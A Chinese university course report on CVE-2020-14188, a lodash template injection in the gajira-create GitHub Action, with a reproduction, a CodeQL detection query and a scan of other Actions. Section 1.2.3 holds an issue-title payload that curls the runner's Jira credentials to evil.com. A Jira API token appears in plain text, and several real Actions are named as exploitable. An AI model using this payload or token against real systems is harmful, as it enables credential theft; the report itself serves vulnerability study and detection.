:::info
**本工程是 2022 年浙江大学《系统安全》课程设计**

**作者**：解雲暄 / 杨申毅 / 王奕天<br />**本文链接**：[https://www.yuque.com/xianyuxuan/coding/github_ci_vul](https://www.yuque.com/xianyuxuan/coding/github_ci_vul)
:::


## 1 漏洞原理和复现

### 1.1 背景知识：GitHub Actions

#### 1.1.1 持续集成&部署
这是一种软件工程方法，为了产品可以快速迭代，同时还能保持高质量。

- [一般流程](https://www.ruanyifeng.com/blog/2015/09/continuous-integration.html)
提交代码-->自动化测试-->合并到主干，构建工程-->二轮测试-->版本部署
- GitHub为这个过程提供了专门的工具，可用于自动执行构建、测试和部署，即GitHub Actions。我们可以通过在存储库中创建工作流(workflow)来构建和测试每个拉取请求，或将合并的拉取请求部署到生产环境等。

#### 1.1.2 action
持续集成的很多操作在不同项目里面是类似的，如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub 把这些操作就称为 action，并且允许开发者把每个操作写成独立的脚本文件，存放到代码仓库，使得其他开发者可以引用。<br />	整个持续集成的过程，就可以简化为action的组合。然而，在这重用操作的过程中，就存在隐患。

#### 1.1.3 workflow
存储库的`.github/workflows`路径下的`yaml`文件，都会被认为是工作流文件，特定的事件能触发对应的工作流的执行。
```yaml
  name: learn-github-actions
  on: [push]
  jobs:
    check-bats-version:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
        - uses: actions/setup-node@v3
          with:
            node-version: '14'
        - run: npm install -g bats
        - run: bats -v
```

- 工作流结构 
   - 指定触发器（即特定事件）
   - 包含若干作业，每个作业都会被分配到一个runner（GitHub 托管的虚拟机）上，默认并行执行。 
      - 在作业内部，包含若干步骤。步骤可以是自己编写的命令序列，也可以使用其他开发者分享的action。 
         - 如何使用action 
            - `uses` 关键字指定此步骤运行的action的位置  `{owner}/{repo}@{ref}`
            - `with` 关键字指定提供给该action的参数

### 1.2 CVE-2020-14188 漏洞

#### 1.2.1 CVE漏洞描述
> The preprocessArgs function in the Atlassian gajira-create GitHub Action before version 2.0.1 allows remote attackers to execute arbitrary code in the context of a GitHub runner by creating a specially crafted GitHub issue.


如果我们在工作流中引用了`2.0.1`版本以前的`Atlassian gajira-create GitHub Action`，由于其中的`preprocessArgs`函数，攻击者可以通过创建精巧的issue，在`GitHub runner`上执行任意代码。

```javascript
  const _ = require('lodash')
  //------------------------------------------------------------------
  preprocessArgs() {
        _.templateSettings.interpolate = /{{([\s\S]+?)}}/g
        const summaryTmpl = _.template(this.argv.summary)
        const descriptionTmpl = _.template(this.argv.description)

        this.argv.summary = summaryTmpl({ event: this.githubEvent })
        this.argv.description = descriptionTmpl({ event: this.githubEvent })
    }
```
_看了和没看区别不大_

#### 1.2.2 前置知识

-  `gajira-create`是什么<br />				![image.png](./assets/1656075999571-4e79226f-d647-4fb1-9201-af92c300515e.png)
> JIRA是Atlassian公司出品的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域

<br />	简单讲，这个action的作用是，根据存储库上的新创建的issue，在jira这个工程管理平台上为相应的工程创建issue，实现同步。那么，为了向jira提交一个issue，我们得有一个token来身份认证。我们需要先使用`Jira Login Action(Used to store credentials for later use by other Jira Actions)`，在runner上配置好相关文件。<br />					![jira_login_token2.png](./assets/1653725135051-39de2c03-2746-4f85-9e3f-391d1e0b16ac.png)
	假如攻击者可以在runner上执行任意代码，就可以读取这个文件的内容，发送到攻击者服务器上，从而攻击者可以操作受害者的jira账户。 

-  **js的模板字符串** 
   - 创建一个字符串模板，根据需要具象化
```javascript
  templateSettings = {
    // 三种渲染模板
    evaluate    : /<%([\s\S]+?)%>/g,  //运行js代码
    interpolate : /<%=([\s\S]+?)%>/g, //key-value替换
    escape      : /<%-([\s\S]+?)%>/g} //key-value替换+转义
```

   - 在这个漏洞中，只用到了第二种
```javascript
_.templateSettings = {interpolate: /\{\{(.+?)\}\}/g };

var template = _.template("Hello {{ name }}!");
var ans = template({name: "Mustache"});
console.log(ans); // Hello Mustache!
```
其中，`templateSettings`用来设置格式；`_.template`用来创建模板函数；`template({name: "Mustache"});`调用模板函数。于是模板字符串`"Hello {{ name }}!"`中被`{{}}`包起来的`name`就被替换为了`Mustache`。 

   - 在创建模板函数的时候<br />![template.png](./assets/1653725170617-0f2c6e82-81ee-4455-b3a1-743e5ea7987f.png)
红框中，source是待构造模板函数的内容，interpolateValue是为模板分隔符包括的内容。可以发现，**待替换的key就相当于是一个表达式**。<br />于是，当**调用这个函数**具象化字符串模板的时候，**key会被执行**。而按照它正常的用途，应当是一个`variable access`，只是一个变量引用，来使用传给这个模板函数的参数对象。

#### 1.2.3 攻击原理

- 编写action者，希望用户使用`gajira-create GitHub Action`的方式

```javascript
uses: atlassian/gajira-create@v2.0.0
with:
    summary: |
    Issue {{ event.issue.title }} created by {{ event.issue.user.login }}
    description: |
    {{ event.issue.body }}
```

```javascript
// 可以通过该变量访问github actions的event环境变量
const githubEvent = require(process.env.GITHUB_EVENT_PATH)
```

```javascript
    // 导入模块
    const _ = require('lodash')
    // 指定{{}}中的key会被值替换
    _.templateSettings.interpolate = /{{([\s\S]+?)}}/g
    // 创建模板函数
    const summaryTmpl = _.template(this.argv.summary)
    // 替换{{}}中的key
    this.argv.summary = summaryTmpl({ event: this.githubEvent })
          //这里的this.githubEvent就是 require(process.env.GITHUB_EVENT_PATH)的结果
```
于是为jira创建的issue的summary会正确地从event环境变量中读取。

- 调用action者未按照预期使用，**导致可能的二次解析**。

```javascript
uses: atlassian/gajira-create@v2.0.0
with:
    summary: |
    ${{ github.event.issue.title }}
    description: |
    ${{ github.event.issue.body }}
```

在发送到runner之前，就先根据上下文解析了`github.event.issue.title`，把`github.event.issue.title`的内容发给了runner。<br />	如果攻击者的issue title包含了{{cmd}}，那么在创建模板函数的时候，{{cmd}}这个字符串传给了template函数，之后调模板函数的时候，`cmd`会被作为一个表达式被执行。故攻击者可以提交包含如下内容的title：<br />`{{ process.mainModule.require('child_process').exec("curl-d @${process.env.HOME}/.jira.d/credentials http://evil.com") }}`<br />	一旦它被执行，受害者持有的`jira API TOKEN`就被攻击者窃取了。

### 1.3 漏洞复现

#### 1.3.1 创建一个jira账户

- **创建一个工作项目**

![image.png](./assets/1653920405508-6ddf847f-1a14-4eb9-ace1-82aa5928409c.png)

- **生成该账户的API TOKEN**

PVeJUXMvJOFtKXbFfDzD32ED

#### 1.3.2 创建仓库，使用引用了jira-create action的工作流

- **工作流文件**
```yaml
name: test_gira
on:
 issues:
    types:
      - opened

jobs:
  build:
    runs-on: ubuntu-latest
    name: Syssec-project
    steps:
    - name: Login
      uses: atlassian/gajira-login@master
      env:
        JIRA_BASE_URL: ${{ secrets.JIRA_BASE_URL }}
        JIRA_USER_EMAIL: ${{ secrets.JIRA_USER_EMAIL }}
        JIRA_API_TOKEN: ${{ secrets.JIRA_API_TOKEN }}

    - name: Jira issue
      uses: atlassian/gajira-create@v2.0.0
      with:
        project: C21T
        issuetype: Task
        summary: |
          ${{ github.event.issue.title }}
        description: |
          ${{ github.event.issue.body }}
```

#### 1.3.3 漏洞触发

- **提交一个issue**

![image.png](./assets/1654066502056-a67928d8-5adb-4ab5-bab1-d89b66dbf527.png)

- **action**

![image.png](./assets/1654066602937-89f5db74-a10e-4f14-b60b-1da9e07ee95a.png)

- **jira界面**

![image.png](./assets/1654066640783-fbe46178-e779-44cd-9f83-dde3a85191cc.png)
这是刚刚在github提交的issue，被Jira Create action同步到了jira。

- **攻击者控制的服务器**

![image.png](./assets/1654066687986-3fc12680-fbd7-4f5b-86f1-8fefdd87d464.png)
成功窃取到了受害者的jira API TOKEN。

## 2 特征匹配设计

### 2.1 背景知识：CodeQL
CodeQL 是 GitHub 开发的静态分析框架；将源代码的语法、语义、数据类型、数据流图、控制流图等相关信息提取到数据库中，然后通过编写 QL 代码查询数据库的方式找到可能存在的漏洞。QL 是一种 query language，也是 logic language。我们简单介绍 QL 的一些基本语法。

显然，一个查询程序的核心就是 queries。Select clauses 的格式如下：
```sql
from /* ... variable declarations ... */
where /* ... logical formula ... */
select /* ... expressions ... */
```
其中，`from`和`where`是可选的。类似 SQL，这里也可以有`as`和`order by`(`asc`, `desc`)。<br />例如：
```sql
from int x, int y
where x = 3 and y in [0 .. 2]
select x, y, x * y as product, "product: " + product
```
可以得到如下结果：
![image.png](./assets/1651811017642-b461afce-d6c0-4551-a49c-00be322473d5.png)

为了简化代码，QL 支持 predicates(谓词)，返回值是真或者假。例如下面两个 predicates：
```sql
predicate isCountry(string country) {
  country = "Germany"
  or
  country = "Belgium"
  or
  country = "France"
}

predicate isSmall(int i) {
  i in [1 .. 9]
}
```
还有一些内置的 predicates，比如`any()`永真，`none()`永假。

QL 还有一些 quantified formulas，例如 `exists(<variable declarations> | <formula>)`，其含义是显然的。

CodeQL 除了内置的类型以外，还可以定义自己的类，进一步提高重用；我们可以通过`import javascript`的方式引入一些设计好的、语言相关的类。类的构造函数规定了满足什么样规则的对象属于这个类，例如：
```
class RequireLodash extends Require {
    RequireLodash() {
        this.getArgument(0).toString() = "'lodash'" 
    }
}
```
类中也可以定义一些成员谓词。


### 2.2 漏洞特征匹配逻辑和实现

#### 2.2.1 匹配逻辑
根据 1.2 节的分析以及实验指导的提示，我们识别这样的漏洞特征：存在一个变量`require('lodash')`；该变量对`interpolate.templateSettings`的赋值，且这个值可以匹配正则表达式：`.*(.*).*`；该变量还调用了`template()`函数。

作为一个 snippet，我们希望识别的情况即：
```javascript
const _ = require('lodash')
_.templateSettings.interpolate = /{([\s\S]+?)}}/g
_.template(args)
```


#### 2.2.2 VulVar
我们设计一个类`VulVar`来表示我们认为有风险的`require`，例如上例中的`_`。因此我们的 select 语句j简化后可以是：
```
from VulVar v
select v, v.requireLodash(), v.vulInterpolate(), v.callTemplate()
```
这里的`v.requireLodash()`和`v.vulInterpolate()`会报告`v`在何处`require`了`lodash`、在何处设置了有风险的正则表达式 pattern 以及在何处调用了`template()`。

下面我们来讨论如何定义`VulVar`这个类：
```
class VulVar extends Variable {
    VulVar() {
        exists(VariableDeclarator vd |
            this = vd.getChild(0).(VarDecl).getVariable()
            and
            exists(isRequireLodash(vd.getChild(1).(Require)))
            and
            exists(hasVulInterpolate(this))
            and
            exists(hasCallTemplate(this))
        )
    }

    Require requireLodash() { /* ... */ }
    AssignExpr vulInterpolate() { /* ... */ }
    MethodCallExpr callTemplate() { /* ... */ }
}
```
首先，在前例中`_`是一个 variable，我们想要匹配的也是 variable，因此我们继承了`Variable`这个类。被识别为`VulVar`的条件是，存在这样一个变量定义：

- 这个变量的值是`require('lodash')`或者`require("lodash")`，即`exists(isRequireLodash(vd.getChild(1).(Require)))`，其中`vd`是声明这个变量的语句；
- 这个变量在后面某处在设置了有风险的正则表达式 pattern，即 `exists(hasVulInterpolate(this))`，其中`this`定义为`vd.getChild(0).(VarDecl).getVariable()`；
- 这个变量在后面某处调用了`template()`函数，即`exists(hasCallTemplate(this))`。

为了易于解释，这里给出赋值语句的 AST，可以使用 VSCode 的 CodeQL 插件的 View AST 工具查看：
![image.png](./assets/1653040928662-10117a1c-0e7f-44c8-ba8f-44f92ab6878a.png)
即：
![](https://cdn.nlark.com/yuque/__graphviz/5e5e6db67122fa28a0f12a939fb82f96.svg#lake_card_v2=eyJ0eXBlIjoiZ3JhcGh2aXoiLCJjb2RlIjoiZ3JhcGggRyB7XG4gICAgcmFua2RpciA9IFRCO1xuICAgIG5vZGUgW3NoYXBlID0gcmVjdGFuZ2xlXTtcbiAgICAwIFtsYWJlbCA9IFwiRGVjbFN0bXRcIl1cbiAgICAxIFtsYWJlbCA9IFwiVmFyaWFibGVEZWNsYXJhdG9yXCJdO1xuICAgIDAgLS0gMVxuICAgIDIgW2xhYmVsID0gXCJWYXJEZWNsXFxuX1wiXTtcbiAgICAzIFtsYWJlbCA9IFwiQ2FsbEV4cHJcIl07XG4gICAgMSAtLSAyLCAzXG4gICAgNCBbbGFiZWwgPSBcIlZhclJlZlxcbnJlcXVpcmVcIl1cbiAgICA1IFtsYWJlbCA9IFwiTGl0ZXJhbFxcbidsb2Rhc2gnXCJdXG4gICAgMyAtLSA0LCA1XG59IiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fZ3JhcGh2aXovNWU1ZTZkYjY3MTIyZmEyOGEwZjEyYTkzOWZiODJmOTYuc3ZnIiwiaWQiOiJFYTVrWSIsIm1hcmdpbiI6eyJ0b3AiOnRydWUsImJvdHRvbSI6dHJ1ZX0sImNhcmQiOiJkaWFncmFtIn0=)上面代码中的`vd.getChild(1).(Require)`即取得了`CallExpr`这个子结点，然后将其转为`Require`。`Require`是 CodeQL for JavaScript 自带的类，用于 require 语句。

我们下面具体解释`isRequireLodash`、`hasVulInterpolate`和`hasCallTemplate`这三个 predicate 的实现。


#### 2.2.3 isRequireLodash
```
Require isRequireLodash(Require r) {
    (r.getArgument(0).toString() = "'lodash'" 
    or 
    r.getArgument(0).toString() = "\"lodash\"")
    and
    result = r
}
```
这个 predicate 的结构很简单，只需要判断`require`的参数是不是`'lodash'`或者`"lodash"`就可以了。<br />`result = r`是将`r`返回回去，这有助于我们更好地查看结果。


#### 2.2.4 hasVulInterpolate
```
AssignExpr hasVulInterpolate(Variable v) {
    exists (AssignExpr asn, DotExpr dot2, DotExpr dot1 |
        result = asn
        and
        isVulIntpFormat(asn.getChild(1))
        and
        dot1 = asn.getChild(0)
        and
        dot1.getChild(1).(Label).toString() = "interpolate"
        and
        dot2 = dot1.getChild(0)
        and
        dot2.getChild(1).(Label).toString() = "templateSettings"
        and
        dot2.getChild(0).(VarRef).getVariable() = v
    )
}
```
这个 predicate 稍微复杂一点，但是目标其实很简单：识别是否存在 `v.templateSettings.interpolate = <vulIntpFormat>`。这是一个赋值语句，我们首先查看这样的语句的 AST：
![](https://cdn.nlark.com/yuque/__graphviz/2567eb12704a37c95124e584d16d8a9b.svg#lake_card_v2=eyJ0eXBlIjoiZ3JhcGh2aXoiLCJjb2RlIjoiZ3JhcGggRyB7XG4gICAgcmFua2RpciA9IFRCO1xuICAgIG5vZGUgW3NoYXBlID0gcmVjdGFuZ2xlXTtcbiAgICAwIFtsYWJlbCA9IFwiQXNzaWduRXhwclwiXVxuICAgIDEgW2xhYmVsID0gXCJEb3RFeHByXCJdO1xuXHRcdDIgW2xhYmVsID0gXCJSZWdFeHBMaXRlcmFsXCJdO1xuICAgIDAgLS0gMSwgMlxuICAgIDMgW2xhYmVsID0gXCJEb3RFeHByXCJdO1xuXHRcdDQgW2xhYmVsID0gXCJMYWJlbFxcbmludGVycG9sYXRlXCJdO1xuXHRcdDEgLS0gMywgNFxuXHRcdDUgW2xhYmVsID0gXCJWYXJSZWZcXG5fXCJdO1xuXHRcdDYgW2xhYmVsID0gXCJMYWJlbFxcbnRlbXBsYXRlU2V0dGluZ3NcIl07XG5cdFx0MyAtLSA1LCA2XG59IiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fZ3JhcGh2aXovMjU2N2ViMTI3MDRhMzdjOTUxMjRlNTg0ZDE2ZDhhOWIuc3ZnIiwiaWQiOiJUNGl6WSIsIm1hcmdpbiI6eyJ0b3AiOnRydWUsImJvdHRvbSI6dHJ1ZX0sImNhcmQiOiJkaWFncmFtIn0=)然后再来看这个 predicate，它判断是否存在这样一个 `AssignExpr`：

   - 第 5 行判断其第 2 个参数是否是有风险的正则表达式 pattern，即`isVulIntpFormat(asn.getChild(1))`
   - 第 3 行表示这个 predicate 返回这个`AssignExpr`
   - 其他行共同用来判断赋值的对象是不是`v.templateSettings.interpolate`

我们采取了比较简单的方式实现`isVulIntpFormat`，即匹配`n.(Literal).toString().regexpMatch(".*\\(.*\\).*")`。

#### 2.2.5 hasCallTemplate
这个 predicate 的实现与之前的实现类似，即：
```
MethodCallExpr hasCallTemplate(Variable v) {
    exists(MethodCallExpr call, DotExpr de |
        result = call
        and
        call.getCallee() = de
        and
        de.getChild(0).(VarRef).getVariable() = v
        and
        call.getCalleeName() = "template"
    )
}
```
我们仅需要判断是否存在一个调用`v.template()`的函数即可。


#### 2.2.6 污点分析设计
我们利用 CodeQL 支持的污点分析功能进行分析。我们将定义一个`VulVar`作为污染源，将访问`template()`作为 sink，构造出如下的污点分析配置：
```
class VulConfig extends TaintTracking::Configuration {
    VulConfig() { this = "VulConfig" }
    
    override predicate isSource(DataFlow::Node node) {
        exists(VariableDeclarator vd |
            vd.getChild(0).(VarDecl).getVariable() instanceof VulVar
            and
            node.getAstNode() = vd.getChild(1)
        )
    }
    
    override predicate isSink(DataFlow::Node node) {
        exists(MethodCallExpr call |
            call.getCalleeName() = "template"
            and
            node.getAstNode() = call.getCallee().getChild(0).(VarRef)
        )
    }
}
```


#### 2.2.7 完整代码和结果
至此，我们形成了如下的识别代码：
```
/**
 * @name CVE-2020-14188
 * @kind path-problem
 * @tag security
 */

import javascript
import DataFlow
import DataFlow::PathGraph

Require isRequireLodash(Require r) {
    (r.getArgument(0).toString() = "'lodash'" 
    or 
    r.getArgument(0).toString() = "\"lodash\"")
    and
    result = r
}

class RequireLodash extends Require {
    RequireLodash() {
        this.getArgument(0).toString() = "'lodash'" 
    }
}

predicate isVulIntpFormat(AstNode n) {
    n.(Literal).toString().regexpMatch(".*\\(.*\\).*")
}

AssignExpr hasVulInterpolate(Variable v) {
    exists (AssignExpr asn, DotExpr dot2, DotExpr dot1 |
        result = asn
        and
        isVulIntpFormat(asn.getChild(1))
        and
        dot1 = asn.getChild(0)
        and
        dot1.getChild(1).(Label).toString() = "interpolate"
        and
        dot2 = dot1.getChild(0)
        and
        dot2.getChild(1).(Label).toString() = "templateSettings"
        and
        dot2.getChild(0).(VarRef).getVariable() = v
    )
}

MethodCallExpr hasCallTemplate(Variable v) {
    exists(MethodCallExpr call, DotExpr de |
        result = call
        and
        call.getCallee() = de
        and
        de.getChild(0).(VarRef).getVariable() = v
        and
        call.getCalleeName() = "template"
    )
}

class VulVar extends Variable {
    VulVar() {
        exists(VariableDeclarator vd |
            this = vd.getChild(0).(VarDecl).getVariable()
            and
            exists(isRequireLodash(vd.getChild(1).(Require)))
            and
            exists(hasVulInterpolate(this))
            and
            exists(hasCallTemplate(this))
        )
    }

    Require requireLodash() {
        exists(VariableDeclarator vd |
            result = isRequireLodash(vd.getChild(1).(Require))
            and
            this = vd.getChild(0).(VarDecl).getVariable()
        )
    }

    AssignExpr vulInterpolate() {
        result = hasVulInterpolate(this)
    }

    MethodCallExpr callTemplate() {
        result = hasCallTemplate(this)
    }
}

class VulConfig extends TaintTracking::Configuration {
    VulConfig() { this = "VulConfig" }
    
    override predicate isSource(DataFlow::Node node) {
        exists(VariableDeclarator vd |
            vd.getChild(0).(VarDecl).getVariable() instanceof VulVar
            and
            node.getAstNode() = vd.getChild(1)
        )
    }
    
    override predicate isSink(DataFlow::Node node) {
        exists(MethodCallExpr call |
            call.getCalleeName() = "template"
            and
            node.getAstNode() = call.getCallee().getChild(0).(VarRef)
        )
    }
}

from VulConfig vulConfig, DataFlow::PathNode source, 
    DataFlow::PathNode sink, VulVar v
where 
    vulConfig.hasFlowPath(source, sink) 
    and
    v = source.getNode().getAstNode().getParent().getChild(0).(VarDecl).getVariable()
select 
    sink.getNode(), source, sink, 
    "The vulnerable variable is $@. It required 'lodash' $@, had vulnerable interpolate $@, called template() $@", 
    v, v.toString(),
    v.requireLodash(), "here", 
    v.vulInterpolate(), "here",
    v.callTemplate(), "here"
```

在 gajira-create v2.0.0 建立的数据库中尝试运行，可以得到结果：
![image.png](./assets/1655741678279-af7b7e3d-d780-4ef0-a7aa-06893991f897.png)
结果中的“here”均为超链接，点击可以到达源代码中对应的位置：
![image.png](./assets/1655745805896-615e827f-ad56-459e-bdf8-d90241f7ee11.png)

在另一个 Action IdanHo/action-discord 中运行，也可以找到一个类似结果：
![image.png](./assets/1655741723020-7e563ba2-63f6-491e-84b2-df7ca79cbc4f.png)
对于每一条结果，我们可以查看其 path，从而观察整个数据流。


## 3 Action 爬取和分析

### 3.1 Clone Seed
[Seed](https://gitee.com/zjusec/syssec22/blob/master/src/proj/1.7/seed.txt)
在每一个seed前面加 `https://github.com/` 然后 clone 。<br />打开`seed.txt`后将`\n`替换成` `后将其切割成切片。对每一个仓库进行`git clone`。
```python
import os
import shutil
with open("seed.txt") as f:
    seedContent = f.read().replace('\n', ' ')

seedSlice = seedContent.split( )
for seed in seedSlice[3:10]:
    # # clone repo path
    os.makedirs('rep', exist_ok = True)
    shutil.rmtree('./rep')
    gitComm = 'git clone https://github.com/' + seed + '.git ./rep'
    os.system(gitComm)
```

### 3.2 创建 CodeQL Database
`codeql database create --language=javascript <target folder> --source-root=<src root>`就是在 <target folder> 创建一个 database（这个 folder 不能已经有 database）；如果省略 `--source-root=<src root>` 的话默认源代码就在当前文件夹。<br />在循环中添加：
```python
#create codeql db path
os.makedirs('db', exist_ok = True)
shutil.rmtree('./db')
codeDb = 'codeql database create --language=javascript ./db --source-root=./rep'
os.system(codeDb)
```

### 3.3 运行`query.ql`

#### 3.3.1 CodeQL CLI配置
CodeQL CLI是CodeQL的命令行接口，VSCode的CodeQL插件需要CodeQL CLI提供编译和命令查询的环境，安装好CodeQL CLI之后，就可以使用QL文件对目标代码进行分析，所以称CodeQL CLI为CodeQL的分析程序。<br />[CodeQL CLI Release](https://github.com/github/codeql-cli-binaries/releases) 下载完成后解压至`$HOME/codeql-home/`并将其加入环境变量。<br />![截屏2022-06-06 23.33.33.png](./assets/1654529736043-6e673f8a-44ce-4fc4-be08-08f4de1f2581.png)

#### 3.3.2 运行query
CodeQL的数据库查询指令为`codeql database analyze --format=<format> --output=<output> [--threads=<num>] [--ram=<MB>] <options>... -- <database> <query|dir|suite|pack>...`
```python
#run query.ql
qlCompile = 'codeql database analyze --rerun --format=csv ./db --output=./res/result.csv query.ql'
#qlCompile = 'codeql database analyze --rerun --format=sarif-latest --output=./res/result ./db query.ql'
os.system(qlCompile)
```
为了判断数据库是否成功创建，在每次循环后将该次循环生成的`result.csv`文件删除。若下一次循环的数据库未能成功创建，则`codeql database analyze`指令会报错，并且不会生成`result.csv`文件。由此可以根据`result.csv`文件的存在与否来判断数据库是否成功创建。
```python
ifSuccess = os.path.exists('./res/result.csv')
if ifSuccess == False:
    myOpen = open('./problemRepo.txt', 'a')
    myOpen.write(seed + ' db analyse failed\n')
    myOpen.close()
```
`query.ql`运行完成后结果写入`result.csv`。若没有漏洞，该文件为空；若有漏洞，则写入信息。根据文件内容判断仓库是否有漏洞，将有漏洞的仓库名写入`problemRepo.txt`。
```python
size = os.path.getsize('./res/result.csv')
if size == 0:
    print(seed + ' no problem\n')
else:
    print(seed + ' has problem\n')
    myOpen = open('./problemRepo.txt', 'a')
    myOpen.write(seed+'\n')
    myOpen.close()
os.remove('./res/result.csv')
```

### 3.4 运行结果
在`problemRepo.txt`中写入seed中所有可能存在漏洞的仓库。<br />![截屏2022-06-24 22.10.23.png](./assets/1656079829021-73b2223d-1d4f-425b-adf5-71801a422798.png)

### 3.5 对结果进行复核
| 编号 | 仓库 | action类型 | 结果 |
| --- | --- | --- | --- |
| 1 | atlassian/gajira-find-issue-key | JavaScript 操作 | 不能攻击 |
| 2 | developer-productivity/gajira-find-issue-key | JavaScript 操作 | 不能攻击 |
| 3 | sunil-bansiwal/find-jira-issue | JavaScript 操作 | 不能攻击 |
| 4 | IdanHo/action-discord | Docker 容器 | 受限攻击 |
| 5 | EPERS-UNQ/action-discord | Docker 容器 | 受限攻击 |
| 6 | Ilshidur/action-discord | Docker 容器 | 受限攻击 |
| 7 | Ilshidur/action-slack | 入口是js，但是后续操作，包括template的调用，在Docker 容器 | 受限攻击 |
| 8 | Sniddl/discord-commits | JavaScript 操作 | 完整攻击，发送消息到受控服务器 |
| 9 | vineetchoudhary/mailgun-action | JavaScript 操作 | 完整攻击，发送消息到受控服务器 |

- 第一个action。**用户输入被限定为了branch或者commit，否则就不解析**。于是不可注入攻击。

![ga_find-jira-issue.png](./assets/1655887546930-096310c1-496d-4aba-9ff8-ebf398b6a384.png)

- 第二个和第三个action都是在第一个action的基础上改的，和第一个action的效果一致。
- 4-7的action都是将操作放在了**docker容器中，这就提供了一个较安全的隔离环境**。一方面，我们的攻击只能获取docker容器中的私密消息，存储在runner上的隐私如jira API Token是不可访问的；另一方面，可能缺少我们希望使用的命令工具，比如curl。于是我们只能执行受限的攻击。

以action7为例：<br />下图表示，我们可以注入代码并且执行。
![image.png](./assets/1655888179694-81efd43e-d4e8-420f-ad49-eae86127d4d6.png)
当我们试图和jira-create-issue一样，将runner上的jira API token发送到受控服务器上时，显示找不到curl程序。因为它的docker镜像不具有这个工具。
![image.png](./assets/1655888379608-c889ed90-eebf-4375-83bf-1cd11e54e2e0.png)
试图打印API token的攻击也是无效的，因为docker隔离了action操作和runner，所以访问不了目标文件。
![image.png](./assets/1655888575627-3512a5b8-3a72-4543-9c20-25dcdea08c28.png)

- 8-9的 action 和最开始介绍的 jira create issue 相似，可以实现较强的攻击。
   - action 8

先使用 jira log in action 来设置好私密消息（也可以是别的私密消息，攻击就是为了窃取仓库所有者临时存储在runner上的隐私），再调用 Sniddl/discord-commits，将输入设置为危险的 <br />`${{ github.event.comment.body }}`
```yaml
name: test_discord_commit
on:
  issue_comment:
    types: deleted

jobs:
  build:
    runs-on: ubuntu-latest
    name: Syssec-project
    steps:
    - name: Login
      uses: atlassian/gajira-login@master
      env:
        JIRA_BASE_URL: ${{ secrets.JIRA_BASE_URL }}
        JIRA_USER_EMAIL: ${{ secrets.JIRA_USER_EMAIL }}
        JIRA_API_TOKEN: ${{ secrets.JIRA_API_TOKEN }}
    - name: Discord Commits
      uses: Sniddl/discord-commits@master
      with:
          webhook: 'null'
          message: ${{ github.event.comment.body }}
          embed: 'null'
          #last-commit-only: false
```
![image.png](./assets/1655888900214-dd761de3-67a3-4672-9b07-54adcccf3c87.png)

   - action 9

和8类似。
![image.png](./assets/1655888945542-7fcadb03-85e7-4bb4-bdb6-b1a3d64cd752.png)

## 4 总结

### 4.1 后续尝试
为了进一步减少 false positive 的情况，我们尝试进一步利用数据流追踪用户输入，从而排除那些虽然作为了 `template()`的参数，但并不属于用户输入的变量。<br />但是，我们在尝试中发现，使用 GitHub Action 向 JavaScript 代码传递参数的手段并不唯一，包括`require('@action/core')`和`process.env`等。我们尝试分别考虑这几种情况。<br />在尝试过程中，我们发现了进一步的问题：CodeQL 的污点分析和数据流分析都无法追踪以下的情况：
```javascript
function parseArgs () {
  return {
    project: core.getInput('project'),
    issuetype: core.getInput('issuetype'),
    summary: core.getInput('summary'),
    description: core.getInput('description'),
    fields: false // TODO
  }
}
```
即，以这种方式返回的`getInput()`的值不会被进一步追踪。我们尝试将 sink 改为`any()`，在 source 分别是`require('@action/core')`和`getInput()`时，分别查询得到如下结果：
![image.png](./assets/1655721796278-5090af6c-4f1c-4ed9-940d-1658f385c06d.png)
![image.png](./assets/1655721989796-972e32c4-5b31-4487-8fa8-7ebcdbc9fdf0.png)
也就是说，CodeQL 自带的污点分析和数据流分析工具无法满足这种情况下的进一步追踪要求；如果继续采用这种方式会增加 false negative 的概率，这是我们不希望看到的。因此我们最终没有采用这一尝试。<br />不过，从之前我们对查询结果的分析中可以看出，本工程中 false positive 的主要原因并不是无法匹配用户输入，而是具体的 action 运行环境的因素。如果要确切实现对用户输入的匹配，我们可能需要通过其他方式来完成。

### 4.2 查询结果表现
我们从 false positive 和 false negative 的角度讨论本工作的表现。<br />本工作查询的对象是 GitHub Action。如我们之前所讨论的那样，只要我们调用`template()`的参数能够被用户输入所控制，那么就存在触发漏洞的风险；只在 README 中“声明”正确的用法是无法避免这种风险的。因此，我们认为本工作的 false positive 的唯一原因是：如我们上一节所说，CodeQL 的能力并不足以稳定地追踪`template()`的参数是否可能来自于用户输入。<br />而关于 false negative，由于我们捕捉的核心是`require('lodash')`和`template()`的引用，这与我们对分析目标的界定是完全一致的。但是，由于 JavaScript 高度的自由性，不排除 Action 的编写者通过字符串拼接、字符串运行等手段拆分或隐藏我们希望捕获的代码。但是对于正常维护的 Action 来说，这种情况并不会发生。因此我们认为本工作的 false negative 可以忽略。<br />总而言之，从 false positive 和 false negative 的角度而言，我们的工作达到了在工具条件限制的情况下接近最优的表现。如果需要进一步提高表现，就需要更加高级的数据流分析工具才能完成了。

### 4.3 总结
本工作通过一个 CodeQL query 实现了对 CVE-2020-14188 以及与其具有类似特征的漏洞的匹配，利用这个 query 在一定范围内检查 GitHub Action 存在的类似漏洞，并进行了复核。我们发现，部分Action对输入作了过滤，所以安全；部分Action使用docker容器来执行操作，所以攻击范围受限；剩下的Action则和CVE-2020-14188一致。<br />这个 query 可以像 CodeQL 官方提供的 query 范例那样被列入自动检查列表中，在 Action 仓库每次更新后或发布前与其他 query 一并进行自动化的检测，从而找出其中可能存在的类似 CVE-2020-14188 的问题，避免 Action 的错误使用造成远程任意代码执行等有可能泄露用户隐私的后果。

## References

- Github Action
   - [https://docs.github.com/cn/actions](https://docs.github.com/cn/actions)
- CVE-2020-14188
   - [https://zjusec.gitee.io/syssec22/proj/#15-github-cicd](https://zjusec.gitee.io/syssec22/proj/#15-github-cicd)
   - [https://securitylab.github.com/advisories/GHSL-2020-172-gajira-create-action](https://securitylab.github.com/advisories/GHSL-2020-172-gajira-create-action)
   - [https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L1741](https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L1741)
- CodeQL
   - 配置：[http://www.zyiz.net/tech/detail-310552.html](http://www.zyiz.net/tech/detail-310552.html)
